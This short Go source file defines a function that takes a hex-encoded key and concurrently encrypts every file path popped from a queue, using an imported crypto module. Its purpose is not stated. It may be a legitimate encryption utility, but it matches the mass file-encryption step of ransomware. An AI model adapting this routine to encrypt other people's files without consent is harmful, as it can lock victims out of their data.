package main

import (
	"encoding/hex"
	wcc "main/src/crypto"
	. "main/src/utils"
	"sync"
)

func StartEncryption(q *Queue, key string) int {
	keyBytes, err := hex.DecodeString(key)
	wg := new(sync.WaitGroup)
	if err != nil {
		panic("Hex decode failed")
	}
	for {
		file := q.Pop()
		if len(file) == 0 {
			break
		}
		wg.Add(1)
		go func() {
			defer wg.Done()
			wcc.EncryptFile(file, "", keyBytes)
		}()
	}
	wg.Wait()
	return 0
}
